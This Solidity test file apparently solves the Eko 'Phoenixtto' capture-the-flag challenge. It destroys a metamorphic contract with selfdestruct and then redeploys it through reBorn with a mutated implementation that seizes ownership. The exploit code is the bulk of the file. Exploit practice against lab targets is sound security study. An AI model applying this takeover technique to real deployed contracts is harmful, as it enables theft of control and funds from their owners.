// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./utils/EkoBaseTest.sol";

import "src/Eko/ChallengePhoenixtto.sol";
import "src/Eko/ChallengePhoenixtto.factory.sol";

contract PhoenixttoTest is EkoBaseTest {
    Laboratory laboratory;

    function preSetupHook() internal override {
        super.preSetupHook();

        /* IMPLEMENT YOUR PRE SETUP */

        // Init the challenge
        factory = new ChallengePhoenixttoFactory();
        challenges = factory.deploy(player);
        laboratory = Laboratory(challenges[0]);
    }

    function postSetupHook() internal override {
        super.postSetupHook();

        /* IMPLEMENT YOUR POST SETUP */

        // The Laboratory is deploying Phoenixtto as a methamorphic smart contract
        // Futher reading
        // - https://a16zcrypto.com/metamorphic-smart-contract-detector-tool/
        // - https://0age.medium.com/the-promise-and-the-peril-of-metamorphic-contracts-9eb8b8413c5e
        // - https://medium.com/@jason.carver/defend-against-wild-magic-in-the-next-ethereum-upgrade-b008247839d2

        // What we need to do is to destroy the metamorphic contract
        // And replace it with our own implementation

        // Destroy the metamorphic contract
        Phoenixtto metamorphic = Phoenixtto(laboratory.addr());
        // we don't care what we pass here, it just needs to go into the `else` case
        // and selfdestruct itself
        // The `_isBorn` must be `true` and the caller must not be a contract or called via `call`
        // because `msg.sender` must be equal to `tx.origin`
        vm.prank(player, player);
        metamorphic.capture("");
    }

    function runExploit() internal override {
        Phoenixtto metamorphic = Phoenixtto(laboratory.addr());

        // Re-deploy the implementation that will replace the metamorphic contract code
        // with our mutated vdersion of the Phoenixtto contract
        laboratory.reBorn(type(PhoenixttoMutated).creationCode);

        // now we can call our own implementation of the `capture` function that will use the code of
        // PhoenixttoMutated.capture
        vm.prank(player);
        metamorphic.capture("");
    }
}

contract PhoenixttoMutated {
    address public owner;

    function reBorn() external {
        // we don't care about this part but we still need to expose
    }

    function capture(string memory _newOwner) external {
        // do nothing
        owner = msg.sender;
    }
}
